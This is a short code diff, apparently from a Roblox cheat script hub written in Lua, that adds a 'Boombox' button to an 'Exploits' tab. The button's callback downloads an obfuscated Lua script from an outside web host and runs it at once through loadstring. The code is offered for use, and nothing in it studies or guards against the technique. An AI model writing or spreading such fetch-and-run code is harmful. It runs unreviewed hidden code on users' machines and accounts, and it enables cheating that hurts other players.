@@ -5356,6 +5356,15 @@ end
 
 
 -- Exploits
+
+Tabs.Exploits:AddButton({
+        Title = "Boombox",
+        Description = "Not Visual",
+        Callback = function()
+            loadstring(game:HttpGet("https://darahub.pages.dev/api/script/obfuscated/Fe/Boomboxs/EvadeOverhaul-RelicsXYZ.lua"))()
+        end
+    }
+)
     
 local FakeSection = Tabs.Exploits:AddSection("Pads")
 
